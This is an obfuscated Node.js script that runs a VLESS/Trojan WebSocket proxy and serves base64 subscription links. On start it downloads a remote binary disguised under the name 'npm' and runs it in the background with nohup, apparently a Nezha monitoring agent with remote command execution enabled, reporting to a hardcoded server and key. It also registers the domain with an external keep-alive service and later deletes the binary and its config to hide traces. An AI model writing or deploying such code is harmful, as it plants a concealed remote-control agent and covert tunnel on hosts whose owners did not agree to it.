const _0x4d60c7=_0x8974;(function(_0x150af4,_0x4e9b40){const _0x1a8041=_0x8974,_0x136be9=_0x150af4();while(!![]){try{const _0x407015=-parseInt(_0x1a8041(0xe3))/0x1+parseInt(_0x1a8041(0x8a))/0x2+-parseInt(_0x1a8041(0x8f))/0x3+-parseInt(_0x1a8041(0xb0))/0x4*(-parseInt(_0x1a8041(0xf7))/0x5)+-parseInt(_0x1a8041(0xfe))/0x6*(parseInt(_0x1a8041(0xbb))/0x7)+parseInt(_0x1a8041(0xd1))/0x8+parseInt(_0x1a8041(0x9d))/0x9;if(_0x407015===_0x4e9b40)break;else _0x136be9['push'](_0x136be9['shift']());}catch(_0x7e75f7){_0x136be9['push'](_0x136be9['shift']());}}}(_0x5537,0x46530));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x4d60c7(0xea)),net=require(_0x4d60c7(0xa3)),path=require(_0x4d60c7(0xfd)),crypto=require(_0x4d60c7(0xaf)),{Buffer}=require(_0x4d60c7(0xfc)),{exec,execSync}=require(_0x4d60c7(0xe2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x4d60c7(0xb3)]||_0x4d60c7(0xcc),NEZHA_SERVER=process[_0x4d60c7(0xe5)][_0x4d60c7(0xca)]||_0x4d60c7(0x86),NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x4d60c7(0xa7)]||'HNW6nzMa6hVkqzcE1267hClSnXdNAKGR',DOMAIN=process[_0x4d60c7(0xe5)][_0x4d60c7(0xfb)]||'1234.abc.com',AUTO_ACCESS=process[_0x4d60c7(0xe5)]['AUTO_ACCESS']||!![],WSPATH=process[_0x4d60c7(0xe5)][_0x4d60c7(0x9e)]||UUID[_0x4d60c7(0xc8)](0x0,0x8),SUB_PATH=process[_0x4d60c7(0xe5)][_0x4d60c7(0xcb)]||_0x4d60c7(0xdf),NAME=process[_0x4d60c7(0xe5)][_0x4d60c7(0x93)]||_0x4d60c7(0xb6),PORT=process[_0x4d60c7(0xe5)][_0x4d60c7(0xee)]||0x2260;let ISP='';const GetISP=async()=>{const _0x5abc1=_0x4d60c7;try{const _0x2d0ae3=await axios['get'](_0x5abc1(0xe0)),_0x232029=_0x2d0ae3['data'];ISP=(_0x232029[_0x5abc1(0xec)]+'-'+_0x232029[_0x5abc1(0x96)])[_0x5abc1(0xe8)](/ /g,'_');}catch(_0xfcff70){ISP=_0x5abc1(0xb7);}};GetISP();const httpServer=http[_0x4d60c7(0x95)]((_0x56e2b3,_0x2f5a90)=>{const _0x1c4bd6=_0x4d60c7;if(_0x56e2b3[_0x1c4bd6(0xe1)]==='/'){const _0x6bbe72=path[_0x1c4bd6(0x9a)](__dirname,_0x1c4bd6(0x99));fs[_0x1c4bd6(0x88)](_0x6bbe72,_0x1c4bd6(0x8b),(_0xda3d7b,_0x3c46d7)=>{const _0x24cee2=_0x1c4bd6;if(_0xda3d7b){_0x2f5a90[_0x24cee2(0x89)](0xc8,{'Content-Type':_0x24cee2(0xcf)}),_0x2f5a90[_0x24cee2(0xab)](_0x24cee2(0xc2));return;}_0x2f5a90[_0x24cee2(0x89)](0xc8,{'Content-Type':_0x24cee2(0xcf)}),_0x2f5a90[_0x24cee2(0xab)](_0x3c46d7);});return;}else{if(_0x56e2b3[_0x1c4bd6(0xe1)]==='/'+SUB_PATH){const _0x7ac70d=_0x1c4bd6(0x94)+UUID+'@'+DOMAIN+_0x1c4bd6(0xef)+DOMAIN+_0x1c4bd6(0xbe)+DOMAIN+_0x1c4bd6(0xc7)+WSPATH+'#'+NAME+'-'+ISP,_0x9c2226='trojan://'+UUID+'@'+DOMAIN+_0x1c4bd6(0xf1)+DOMAIN+_0x1c4bd6(0xbe)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x25bfa1=_0x7ac70d+'\x0a'+_0x9c2226,_0x1c29d7=Buffer[_0x1c4bd6(0xbc)](_0x25bfa1)['toString']('base64');_0x2f5a90[_0x1c4bd6(0x89)](0xc8,{'Content-Type':_0x1c4bd6(0xc9)}),_0x2f5a90[_0x1c4bd6(0xab)](_0x1c29d7+'\x0a');}else _0x2f5a90[_0x1c4bd6(0x89)](0x194,{'Content-Type':_0x1c4bd6(0xc9)}),_0x2f5a90[_0x1c4bd6(0xab)](_0x1c4bd6(0xfa));}}),wss=new WebSocket[(_0x4d60c7(0xdc))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x4d60c7(0xc3),'1.1.1.1'];function resolveHost(_0x353e8a){return new Promise((_0x43909b,_0x19376a)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x353e8a)){_0x43909b(_0x353e8a);return;}let _0x149c43=0x0;function _0x2be70e(){const _0x49d326=_0x8974;if(_0x149c43>=DNS_SERVERS[_0x49d326(0x9c)]){_0x19376a(new Error(_0x49d326(0xc4)+_0x353e8a+_0x49d326(0xdd)));return;}const _0x499236=DNS_SERVERS[_0x149c43];_0x149c43++;const _0x3ddc43=_0x49d326(0xd9)+encodeURIComponent(_0x353e8a)+_0x49d326(0x100);axios['get'](_0x3ddc43,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x49d326(0xb8)](_0x2946bf=>{const _0x56a195=_0x49d326,_0xcf2c2=_0x2946bf['data'];if(_0xcf2c2[_0x56a195(0xf4)]===0x0&&_0xcf2c2[_0x56a195(0xb4)]&&_0xcf2c2['Answer']['length']>0x0){const _0x28de03=_0xcf2c2[_0x56a195(0xb4)][_0x56a195(0xcd)](_0x2f7e87=>_0x2f7e87[_0x56a195(0xde)]===0x1);if(_0x28de03){_0x43909b(_0x28de03[_0x56a195(0xae)]);return;}}_0x2be70e();})['catch'](_0x423608=>{_0x2be70e();});}_0x2be70e();});}function _0x8974(_0xbe0168,_0x10d31c){const _0x5537d1=_0x5537();return _0x8974=function(_0x89742d,_0x38ae92){_0x89742d=_0x89742d-0x86;let _0x177cf7=_0x5537d1[_0x89742d];return _0x177cf7;},_0x8974(_0xbe0168,_0x10d31c);}function handleVlessConnection(_0x320141,_0x359a4b){const _0x8b70=_0x4d60c7,[_0x3abc26]=_0x359a4b,_0x3cdce6=_0x359a4b['slice'](0x1,0x11);if(!_0x3cdce6[_0x8b70(0xf8)]((_0x11d53a,_0x307253)=>_0x11d53a==parseInt(uuid[_0x8b70(0xd0)](_0x307253*0x2,0x2),0x10)))return![];let _0x902682=_0x359a4b[_0x8b70(0xc8)](0x11,0x12)[_0x8b70(0xb9)]()+0x13;const _0x2390c8=_0x359a4b[_0x8b70(0xc8)](_0x902682,_0x902682+=0x2)[_0x8b70(0xe4)](0x0),_0x886c21=_0x359a4b[_0x8b70(0xc8)](_0x902682,_0x902682+=0x1)[_0x8b70(0xb9)](),_0x42ddf6=_0x886c21==0x1?_0x359a4b[_0x8b70(0xc8)](_0x902682,_0x902682+=0x4)[_0x8b70(0x9a)]('.'):_0x886c21==0x2?new TextDecoder()[_0x8b70(0x9b)](_0x359a4b[_0x8b70(0xc8)](_0x902682+0x1,_0x902682+=0x1+_0x359a4b[_0x8b70(0xc8)](_0x902682,_0x902682+0x1)[_0x8b70(0xb9)]())):_0x886c21==0x3?_0x359a4b[_0x8b70(0xc8)](_0x902682,_0x902682+=0x10)[_0x8b70(0xf5)]((_0x324560,_0x522a57,_0x5ab61a,_0x50134b)=>_0x5ab61a%0x2?_0x324560[_0x8b70(0xe9)](_0x50134b[_0x8b70(0xc8)](_0x5ab61a-0x1,_0x5ab61a+0x1)):_0x324560,[])[_0x8b70(0xe7)](_0x203824=>_0x203824['readUInt16BE'](0x0)[_0x8b70(0x97)](0x10))[_0x8b70(0x9a)](':'):'';_0x320141['send'](new Uint8Array([_0x3abc26,0x0]));const _0x109345=createWebSocketStream(_0x320141);return resolveHost(_0x42ddf6)[_0x8b70(0xb8)](_0x352e6c=>{const _0xa6d673=_0x8b70;net[_0xa6d673(0xd4)]({'host':_0x352e6c,'port':_0x2390c8},function(){const _0x467ace=_0xa6d673;this[_0x467ace(0xd6)](_0x359a4b[_0x467ace(0xc8)](_0x902682)),_0x109345['on'](_0x467ace(0xdb),()=>{})[_0x467ace(0xed)](this)['on']('error',()=>{})[_0x467ace(0xed)](_0x109345);})['on'](_0xa6d673(0xdb),()=>{});})[_0x8b70(0xce)](_0x19dc4f=>{const _0xd89bcf=_0x8b70;net[_0xd89bcf(0xd4)]({'host':_0x42ddf6,'port':_0x2390c8},function(){const _0x4d3550=_0xd89bcf;this[_0x4d3550(0xd6)](_0x359a4b['slice'](_0x902682)),_0x109345['on']('error',()=>{})['pipe'](this)['on'](_0x4d3550(0xdb),()=>{})['pipe'](_0x109345);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2ca197,_0x4e4879){const _0x3a1651=_0x4d60c7;try{if(_0x4e4879[_0x3a1651(0x9c)]<0x3a)return![];const _0x3495b1=_0x4e4879['slice'](0x0,0x38)[_0x3a1651(0x97)](),_0x529e42=[UUID];let _0x34fd83=null;for(const _0x25de86 of _0x529e42){const _0x5d1292=crypto['createHash'](_0x3a1651(0xa4))[_0x3a1651(0x98)](_0x25de86)[_0x3a1651(0xa6)](_0x3a1651(0xd2));if(_0x5d1292===_0x3495b1){_0x34fd83=_0x25de86;break;}}if(!_0x34fd83)return![];let _0x19700e=0x38;_0x4e4879[_0x19700e]===0xd&&_0x4e4879[_0x19700e+0x1]===0xa&&(_0x19700e+=0x2);const _0x5dd3f6=_0x4e4879[_0x19700e];if(_0x5dd3f6!==0x1)return![];_0x19700e+=0x1;const _0x4a76da=_0x4e4879[_0x19700e];_0x19700e+=0x1;let _0x198f66,_0x3abd0a;if(_0x4a76da===0x1)_0x198f66=_0x4e4879['slice'](_0x19700e,_0x19700e+0x4)['join']('.'),_0x19700e+=0x4;else{if(_0x4a76da===0x3){const _0x3bcb75=_0x4e4879[_0x19700e];_0x19700e+=0x1,_0x198f66=_0x4e4879[_0x3a1651(0xc8)](_0x19700e,_0x19700e+_0x3bcb75)[_0x3a1651(0x97)](),_0x19700e+=_0x3bcb75;}else{if(_0x4a76da===0x4)_0x198f66=_0x4e4879[_0x3a1651(0xc8)](_0x19700e,_0x19700e+0x10)[_0x3a1651(0xf5)]((_0x4ffaad,_0x21213c,_0x1f9c43,_0x36fcad)=>_0x1f9c43%0x2?_0x4ffaad['concat'](_0x36fcad[_0x3a1651(0xc8)](_0x1f9c43-0x1,_0x1f9c43+0x1)):_0x4ffaad,[])['map'](_0x2093a1=>_0x2093a1['readUInt16BE'](0x0)[_0x3a1651(0x97)](0x10))['join'](':'),_0x19700e+=0x10;else return![];}}_0x3abd0a=_0x4e4879['readUInt16BE'](_0x19700e),_0x19700e+=0x2;_0x19700e<_0x4e4879[_0x3a1651(0x9c)]&&_0x4e4879[_0x19700e]===0xd&&_0x4e4879[_0x19700e+0x1]===0xa&&(_0x19700e+=0x2);const _0x14c45d=createWebSocketStream(_0x2ca197);return resolveHost(_0x198f66)[_0x3a1651(0xb8)](_0x1a6135=>{const _0x30742f=_0x3a1651;net[_0x30742f(0xd4)]({'host':_0x1a6135,'port':_0x3abd0a},function(){const _0x575b27=_0x30742f;_0x19700e<_0x4e4879['length']&&this[_0x575b27(0xd6)](_0x4e4879['slice'](_0x19700e)),_0x14c45d['on'](_0x575b27(0xdb),()=>{})[_0x575b27(0xed)](this)['on']('error',()=>{})[_0x575b27(0xed)](_0x14c45d);})['on']('error',()=>{});})['catch'](_0x1feb8d=>{const _0x2d2dba=_0x3a1651;net[_0x2d2dba(0xd4)]({'host':_0x198f66,'port':_0x3abd0a},function(){const _0x363f52=_0x2d2dba;_0x19700e<_0x4e4879[_0x363f52(0x9c)]&&this[_0x363f52(0xd6)](_0x4e4879['slice'](_0x19700e)),_0x14c45d['on'](_0x363f52(0xdb),()=>{})[_0x363f52(0xed)](this)['on'](_0x363f52(0xdb),()=>{})['pipe'](_0x14c45d);})['on'](_0x2d2dba(0xdb),()=>{});}),!![];}catch(_0x29d103){return![];}}wss['on'](_0x4d60c7(0xeb),(_0x4733b6,_0x18cf19)=>{const _0x4e324d=_0x4d60c7,_0x290684=_0x18cf19[_0x4e324d(0xe1)]||'';_0x4733b6[_0x4e324d(0xc0)]('message',_0x20b1ea=>{const _0x452c2c=_0x4e324d;if(_0x20b1ea[_0x452c2c(0x9c)]>0x11&&_0x20b1ea[0x0]===0x0){const _0x4fd61d=_0x20b1ea['slice'](0x1,0x11),_0x566830=_0x4fd61d[_0x452c2c(0xf8)]((_0x52c2c9,_0x17a148)=>_0x52c2c9==parseInt(uuid['substr'](_0x17a148*0x2,0x2),0x10));if(_0x566830){!handleVlessConnection(_0x4733b6,_0x20b1ea)&&_0x4733b6[_0x452c2c(0xa2)]();return;}}!handleTrojanConnection(_0x4733b6,_0x20b1ea)&&_0x4733b6['close']();})['on'](_0x4e324d(0xdb),()=>{});});const getDownloadUrl=()=>{const _0xa175b1=_0x4d60c7,_0x2f74e5=os[_0xa175b1(0xf9)]();return _0x2f74e5==='arm'||_0x2f74e5===_0xa175b1(0xf2)||_0x2f74e5===_0xa175b1(0xbf)?!NEZHA_PORT?_0xa175b1(0xba):_0xa175b1(0xc6):!NEZHA_PORT?_0xa175b1(0xb5):_0xa175b1(0xa0);},downloadFile=async()=>{const _0x1770a2=_0x4d60c7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4fe47c=getDownloadUrl(),_0x1825e3=await axios({'method':_0x1770a2(0xa8),'url':_0x4fe47c,'responseType':'stream'}),_0x5142e1=fs['createWriteStream'](_0x1770a2(0xda));return _0x1825e3[_0x1770a2(0xae)][_0x1770a2(0xed)](_0x5142e1),new Promise((_0x29f4a4,_0x23f314)=>{_0x5142e1['on']('finish',()=>{const _0x349c30=_0x8974;console[_0x349c30(0xa1)](_0x349c30(0xaa)),exec(_0x349c30(0xa9),_0x411502=>{if(_0x411502)_0x23f314(_0x411502);_0x29f4a4();});}),_0x5142e1['on']('error',_0x23f314);});}catch(_0x212f04){throw _0x212f04;}},runnz=async()=>{const _0x56061b=_0x4d60c7;try{const _0x3b9a0f=execSync(_0x56061b(0xff),{'encoding':'utf-8'});if(_0x3b9a0f['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x56fbae){}await downloadFile();let _0x5e6aae='',_0x444992=[_0x56061b(0xd7),'8443',_0x56061b(0xe6),'2087','2083',_0x56061b(0xa5)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5ac51d=_0x444992[_0x56061b(0x9f)](NEZHA_PORT)?_0x56061b(0x8c):'';_0x5e6aae='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x56061b(0xad)+NEZHA_KEY+'\x20'+_0x5ac51d+_0x56061b(0xf6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x24ddda=NEZHA_SERVER[_0x56061b(0x9f)](':')?NEZHA_SERVER[_0x56061b(0x87)](':')[_0x56061b(0xd3)]():'',_0x466d10=_0x444992[_0x56061b(0x9f)](_0x24ddda)?_0x56061b(0x90):_0x56061b(0xd8),_0x20a013=_0x56061b(0xc1)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x56061b(0xb2)+_0x466d10+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x56061b(0x91)](_0x56061b(0xf0),_0x20a013);}_0x5e6aae='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x56061b(0xa1)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5e6aae,{'shell':'/bin/bash'},_0x24769f=>{const _0x151cef=_0x56061b;if(_0x24769f)console[_0x151cef(0xdb)](_0x151cef(0xf3),_0x24769f);else console[_0x151cef(0xa1)](_0x151cef(0xac));});}catch(_0x77a5d){console[_0x56061b(0xdb)](_0x56061b(0xb1)+_0x77a5d);}};async function addAccessTask(){const _0x262aaa=_0x4d60c7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b64a1=_0x262aaa(0x8e)+DOMAIN;try{const _0x197ac1=await axios['post'](_0x262aaa(0xc5),{'url':_0x1b64a1},{'headers':{'Content-Type':_0x262aaa(0x8d)}});console[_0x262aaa(0xa1)](_0x262aaa(0x92));}catch(_0x5429c9){}}const delFiles=()=>{const _0x15e76e=_0x4d60c7;fs[_0x15e76e(0xd5)](_0x15e76e(0xda),()=>{}),fs[_0x15e76e(0xd5)](_0x15e76e(0xf0),()=>{});};function _0x5537(){const _0x5bca67=['NAME','vless://','createServer','asOrganization','toString','update','index.html','join','decode','length','2323197DtLSCU','WSPATH','includes','https://amd64.ssss.nyc.mn/agent','log','close','net','sha224','2053','digest','NEZHA_KEY','get','chmod\x20+x\x20npm','npm\x20download\x20successfully','end','npm\x20is\x20running','\x20-p\x20','data','crypto','12756NtuFcq','error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','UUID','Answer','https://amd64.ssss.nyc.mn/v1','Hug','Unknown','then','readUInt8','https://arm64.ssss.nyc.mn/v1','77SbOCYk','from','Server\x20is\x20running\x20on\x20port\x20','&fp=chrome&type=ws&host=','aarch64','once','client_secret:\x20','Hello\x20world!','8.8.4.4','Failed\x20to\x20resolve\x20','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/agent','&path=%2F','slice','text/plain','NEZHA_SERVER','SUB_PATH','8ce1b115-fcc9-4906-89a0-65ba26de58be','find','catch','text/html','substr','1641992wYDAFq','hex','pop','connect','unlink','write','443','false','https://dns.google/resolve?name=','npm','error','Server','\x20with\x20all\x20DNS\x20servers','type','6dw','https://speed.cloudflare.com/meta','url','child_process','467900emPzPd','readUInt16BE','env','2096','map','replace','concat','axios','connection','country','pipe','PORT',':443?encryption=none&security=tls&sni=','config.yaml',':443?security=tls&sni=','arm64','npm\x20running\x20error:','Status','reduce','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','535wdxTEH','every','arch','Not\x20Found\x0a','DOMAIN','buffer','path','13854fivduw','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','&type=A','132.145.123.158:8008','split','readFile','writeHead','328650LWIwHo','utf8','--tls','application/json','https://','562749xjkRDB','true','writeFileSync','Automatic\x20Access\x20Task\x20added\x20successfully'];_0x5537=function(){return _0x5bca67;};return _0x5537();}httpServer['listen'](PORT,()=>{const _0x3043b5=_0x4d60c7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3043b5(0xa1)](_0x3043b5(0xbd)+PORT);});
